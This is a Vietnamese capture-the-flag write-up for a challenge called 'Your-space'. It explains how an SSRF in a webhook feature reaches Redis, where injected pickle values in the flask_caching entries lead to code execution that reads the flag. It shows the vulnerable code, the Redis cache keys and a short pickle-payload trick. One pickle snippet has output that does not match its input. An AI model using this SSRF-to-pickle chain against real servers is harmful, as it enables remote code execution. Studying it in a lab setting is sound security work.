# Your-space

Idea: bài này khai thác dựa vào flask_caching + ssrf đối redis + RCE

Link [này](https://y4y.space/2020/09/14/csawctf-2020-qualification-round-writeup/) là một bài ctf na ná và ở [đây](https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/ssrf/#redis-exploitation) là cheatsheet để khai thác.

Mình sẽ đi thẳng vào solution luôn, đầu tiên là SSRF ở `notify.py`

```py
def notify_single(url, body):
    c = pycurl.Curl()
    c.setopt(pycurl.URL, url)
    c.setopt(
        pycurl.HTTPHEADER,
        [
            "Accept: application/json",
            "Content-Type: application/json",
        ],
    )
    c.setopt(pycurl.POST, 1)
    c.setopt(pycurl.TIMEOUT_MS, 1000)

    c.setopt(pycurl.READDATA, StringIO(body))
    c.setopt(pycurl.WRITEFUNCTION, len)
    c.setopt(pycurl.POSTFIELDSIZE, len(body))

    c.perform()
```

`url` ta có thể control được từ việc update webhook.

Tiếp theo là ở `space.py`

```py
@space.route("/space/<space_id>")
def view(space_id):
    space = Space.query.get(space_id)
    if space is None:
        return abort(404)
    subscribed = None
    if current_user.is_authenticated:
        subscribed = get_subscription(current_user, space) is not None
    subs = num_subscriptions(space.id)
    return render_template("space.html", subscribed=subscribed, subs=subs, space=space)
```

route này sử dụng một function là `num_subscriptions()` đã được cache với 

```py
@cache.memoize(timeout=60)
def num_subscriptions(space_id):
    return len(Subscription.query.filter_by(space_id=space_id).all())
```

exec vào container của redis, xong đó xem key-value được lưu trữ tại thời điểm function này được cache:
```
PS C:\Users\ASUS> docker exec -it f4 redis-cli
127.0.0.1:6379> keys *
1) "flask_cache_app.routes.space.num_subscriptions_memver"
2) "flask_cache_xk28vUr8TTGcOgNTXzIN9g"
127.0.0.1:6379> get flask_cache_app.routes.space.num_subscriptions_memver
"!\x80\x05\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06XzIN9g\x94."
127.0.0.1:6379> get flask_cache_xk28vUr8TTGcOgNTXzIN9g
"!\x80\x05K\x00."
127.0.0.1:6379>
```

Có thể rút ra một vài điều sau:
1. Giá trị được lưu ở dạng serialized
2. Hai cặp key-value được tạo, ở đây nếu để ý sẽ thấy ở `flask_cache_app.routes.space.num_subscriptions_memver` sẽ lưu giá trị `XzIN9g` và giá trị này cũng chính là phần subfix của `flask_cache_xk28vUr8TTGcOgNTXzIN9g`. Ở key `flask_cache_xk28vUr8TTGcOgNTXzIN9g` lưu giá trị là kết quả của hàm tính tổng số subscriptions, hiện tại đang là 0.
Dạng cache key của nó sẽ như sau khi gọi `@cache.memoize()`:
1. `flask_cache_app.routes.space.num_subscriptions_memver`, chứa giá trị <IDENTIFIER>
2. `flask_cache_<hash><IDENTIFIER>`, giá trị hash này là một const và có thể đọc từ trong source hoặc ở đây ta exec vào container và thấy được chính là `xk28vUr8TTGcOgNT`

Và bởi vì value được lưu ở dạng `"!" + <serialized object>` nên ta có thể khai thác RCE

Các bước khai thác sẽ là
- SET cho giá trị của `flask_cache_app.routes.space.num_subscriptions_memver` thành empty string (cho tiện)
- Lúc này ta cần set giá trị cho `flask_cache_xk28vUr8TTGcOgNT` là dạng serialized của `from app import flag`

Vì đề limit length của webhook là 96 kí tự, nên ở đây có một trick khá hay mình học được từ các thánh trên discord:

```
>>> from pickle import dumps
>>> dumps("", protocol=0)
b'V\np0\n.'
```

`protocol` càng nhỏ thì chuỗi byte cũng sẽ ngắn

đối với `from app import flag` thì có thể tạo một file `app.py`, trong `app.py` gán `flag=""` và cũng tương tự:
```
>>> import pickle
>>> from app import flag
b'capp\nflag\np0\n.'
>>> pickle.dumps("", protocol=0)
b'V\np0\n.'
```

Chạy file `exp.py` trong thư mục `solve` của mình và flag sẽ hiện ra ở `/space/1`